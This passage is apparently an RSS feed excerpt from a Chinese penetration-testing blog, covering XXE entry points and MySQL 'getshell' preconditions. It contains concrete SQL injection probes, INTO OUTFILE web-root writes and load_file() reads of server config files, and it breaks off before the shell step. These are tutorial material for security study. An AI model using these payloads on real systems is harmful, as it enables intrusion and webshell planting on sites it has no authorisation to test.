&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;实战向&#34;&gt;实战向：&lt;/h2&gt;
&lt;h3 id=&#34;怎么去寻找漏洞点&#34;&gt;怎么去寻找漏洞点：&lt;/h3&gt;
&lt;p&gt;显式的XML接口：&lt;/p&gt;
&lt;p&gt;如果请求头是 &lt;code&gt;Content-Type: application/xml&lt;/code&gt; 或 &lt;code&gt;text/xml&lt;/code&gt;，且数据包体是 XML，那么可以直接插入payload进行测试，但是感觉现在很少了&lt;/p&gt;
&lt;p&gt;隐式接口（content-Type欺骗）：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;假设一个api接口是这样的：
POST /api/login HTTP/1.1
Content-Type: application/json

{&amp;#34;user&amp;#34;: &amp;#34;admin&amp;#34;, &amp;#34;pass&amp;#34;: &amp;#34;123&amp;#34;}

很多框架为了兼容性，会根据Content-Type切换解析器，所以我们构造payload

POST /api/login HTTP/1.1
Content-Type: application/xml  &amp;lt;-- 修改这里

&amp;lt;?xml version=&amp;#34;1.0&amp;#34; ?&amp;gt;
&amp;lt;user&amp;gt;admin&amp;lt;/user&amp;gt;
&amp;lt;pass&amp;gt;123&amp;lt;/pass&amp;gt;

如果这时候服务器没有报错说明支持xml格式，那么就可以构造payload测试xxe漏洞了
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;文件上传（SVG与office）&amp;ndash;这个是比较容易被忽视的点&lt;/p&gt;
&lt;p&gt;svg： 是一种图片格式的矢量图。微信头像，网站logo上传处&lt;/p&gt;
&lt;p&gt;Execl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传，报表导入处&lt;/p&gt;</description>
    </item>
    <item>
      <title>MySQL getshell</title>
      <link>http://localhost:1313/posts/mysql-getshell/</link>
      <pubDate>Fri, 30 Jan 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/mysql-getshell/</guid>
      <description>&lt;h2 id=&#34;udf--os-shell&#34;&gt;UDF  (&amp;ndash;os-shell)&lt;/h2&gt;
&lt;h3 id=&#34;利用条件&#34;&gt;利用条件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;数据库为DBA,可以使用sqlmap的&lt;code&gt;--is-dba&lt;/code&gt;查看当前网站连接的数据库账户是否是管理员&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;没有具体值&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;查找:
1. --sql-shell 
1. 进入数据库后: SHOW VARS LIKE &amp;#39;secure_file_priv&amp;#39;;
2. 盲注:使用length()函数推测: ?id=1 AND (SELECT @@secure_file_priv) IS NULL 
	返回正常则null,无法写入
	页面异常则,则不是null
	判断是否为空:
	?id=1 AND length(@@secure_file_priv) = 0	页面正常则为空
3. 尝试写入文件: ?id=1 INTO OUTFILE &amp;#39;/var/www/html/test.txt&amp;#39; -- 根据报错信息判断
4.权限检查: ?id=1 AND (SELECT user_privileges FROM information_schema.user_privileges WHERE privilege_type=&amp;#39;FILE&amp;#39; AND grantee=CONCAT(&amp;#34;&amp;#39;&amp;#34;, (SELECT CURRENT_USER()), &amp;#34;&amp;#39;&amp;#34;)) IS NOT NULL	即使secure_file_priv为空,用户没有FILE权限,也无法写入
或者
AND (SELECT 1 FROM mysql.user LIMIT 1)，如果能访问 mysql 库，通常意味着是高权限。
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;知道网站的绝对路径&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;查找:
1. 注入报错信息
2. 利用内部函数和元数据:
Apache (Ubuntu):  UNION SELECT 1, load_file(&amp;#39;/etc/apache2/sites-enabled/000-default.conf&amp;#39;), 3
Nginx:               UNION SELECT 1, load_file(&amp;#39;/etc/nginx/nginx.conf&amp;#39;), 3
Windows (IIS):       C:\Windows\System32\inetsrv\config\applicationHost.config
3.常见的默认路径:
Linux (Apache)	/var/www/html/, /var/www/www.example.com/
Linux (Nginx)	/usr/share/nginx/html/, /var/www/html/
Windows (IIS)	C:\inetpub\wwwroot\
Windows (XAMPP)	C:\xampp\htdocs\
Windows (phpStudy)	D:\phpstudy_pro\WWW\, C:\phpStudy\WWW\
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h3&gt;
&lt;p&gt;方法一: &amp;ndash;os-shell&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
